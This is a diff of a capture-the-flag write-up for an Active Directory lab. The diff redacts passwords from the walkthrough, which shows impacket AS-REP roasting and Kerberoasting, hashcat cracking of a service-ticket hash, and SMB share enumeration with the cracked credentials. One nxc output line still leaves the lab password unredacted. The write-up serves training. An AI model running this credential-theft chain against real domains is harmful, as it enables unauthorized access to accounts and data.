@@ -226,7 +226,7 @@ $ cat user.txt
 Since I have valid credentials, I tried to check for users that `Do not require Kerberos preauthentication` but no entries was found.
 
 ```bash
-$ GetNPUsers.py -request -dc-ip soup.thm "SOUPEDECODE.LOCAL/ybob317:ybob317"
+$ GetNPUsers.py -request -dc-ip soup.thm "SOUPEDECODE.LOCAL/ybob317:{REDACTED}"
 /usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'GetNPUsers.py')
 Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 
@@ -237,7 +237,7 @@ No entries found!
 I tried `GetUserSPNs.py` next to hunt for `service accounts` where I can try and crack their passwords.
 
 ```bash
-$ GetUserSPNs.py -request -dc-ip soup.thm "SOUPEDECODE.LOCAL/ybob317:ybob317" 
+$ GetUserSPNs.py -request -dc-ip soup.thm "SOUPEDECODE.LOCAL/ybob317:{REDACTED}" 
 /usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260916.40533.c38d1eeb', 'GetUserSPNs.py')
 Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its affiliated companies 
@@ -278,7 +278,7 @@ Save the hashes in a text file.
 $ hashcat -m 13100 -a 0 svc_tickets /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 hashcat (v7.1.2) starting
 
-$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$0fe8f7063d985b7157d380380b0e0163$1fa92ce76025a6b4757dfa5ecf19f205d97846180ee6f4d2b1c4af4f4b04ba5aebd677fd650054661e32d50c8f4b4fb6667404132167110dd665cccdcbd28f32acc843be49efcb71e22f80feb2a3d82966415e4c770633d11fe94478fde13b626f67ad5fd0c394027124fb0fb8138e4c9f219f91c12<SNIP>:Password123!! # <- FILE_SVC Password
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$0fe8f7063d985b7157d380380b0e0163$1fa92ce76025a6b4757dfa5ecf19f205d97846180ee6f4d2b1c4af4f4b04ba5aebd677fd650054661e32d50c8f4b4fb6667404132167110dd665cccdcbd28f32acc843be49efcb71e22f80feb2a3d82966415e4c770633d11fe94478fde13b626f67ad5fd0c394027124fb0fb8138e4c9f219f91c12<SNIP>:{REDACTED} # <- FILE_SVC Password
 
 ```
 
@@ -291,7 +291,7 @@ Things I tried that did not work with these credentials:
 I went back to shares and found that `file_svc` have `READ` permission on share `BACKUP`.
 
 ```bash
-$ nxc smb SOUPEDECODE.LOCAL -u file_svc -p 'Password123!!' --shares                                                       
+$ nxc smb SOUPEDECODE.LOCAL -u file_svc -p '{REDACTED}' --shares                                                       
 SMB         10.48.173.246   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
 SMB         10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
 SMB         10.48.173.246   445    DC01             [*] Enumerated shares
